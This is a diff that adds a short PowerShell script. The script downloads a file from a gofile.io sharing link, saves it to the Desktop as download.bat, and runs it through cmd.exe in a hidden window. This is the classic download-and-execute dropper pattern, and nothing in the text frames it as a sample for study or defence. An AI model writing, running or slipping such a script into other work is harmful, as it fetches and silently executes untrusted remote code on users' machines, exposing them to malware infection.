@@ -1,0 +1,6 @@
+$url = "https://gofile.io/d/CGqXuF"
+$desktop = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "download.bat")
+
+Invoke-WebRequest -Uri $url -OutFile $desktop
+
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$desktop`"" -WindowStyle Hidden
